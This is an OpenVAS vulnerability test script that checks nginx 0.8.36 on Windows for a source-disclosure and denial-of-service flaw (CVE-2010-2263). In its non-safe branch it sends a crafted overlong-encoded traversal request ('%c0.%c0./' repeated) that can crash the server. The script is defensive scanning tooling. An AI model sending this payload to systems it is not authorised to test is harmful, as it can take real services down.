###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nginx_40760.nasl 13859 2019-02-26 05:27:33Z ckuersteiner $
#
# nginx Remote Source Code Disclosure and Denial of Service Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:nginx:nginx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100676");
  script_version("$Revision: 13859 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-26 06:27:33 +0100 (Tue, 26 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-06-14 14:19:59 +0200 (Mon, 14 Jun 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-2263");
  script_bugtraq_id(40760);

  script_name("nginx Remote Source Code Disclosure and Denial of Service Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/40760");
  script_xref(name:"URL", value:"http://nginx.org/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("os_detection.nasl", "nginx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nginx/installed", "Host/runs_windows");

  script_tag(name:"summary", value:"nginx is prone to remote source-code-disclosure and denial of service
vulnerabilities.

An attacker can exploit these vulnerabilities to view the source code of files in the context of the server
process or cause denial-of-service conditions.

nginx 0.8.36 for Windows is vulnerable, other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("version_func.inc");


if (!port = get_app_port(cpe: CPE))
  exit(0);

if(safe_checks()) {
  if (!version = get_app_version(cpe: CPE, port: port))
    exit(0);

  if (version_is_equal(version: version, test_version:"0.8.36")) {
    report = report_fixed_ver(installed_version: version, fixed_version: "None");
    security_message(port: port, data: report);
    exit(0);
  }
} else {
  if (http_is_dead(port:port))
    exit(0);

  req = string("GET /%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%20 HTTP/1.1\r\nHost: ",get_host_name(),"\r\n\r\n");

  soc = http_open_socket(port);
  if(!soc)
    exit(0);

  send(socket: soc, data: req);

  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }

  http_close_socket(soc);
}

exit(99);
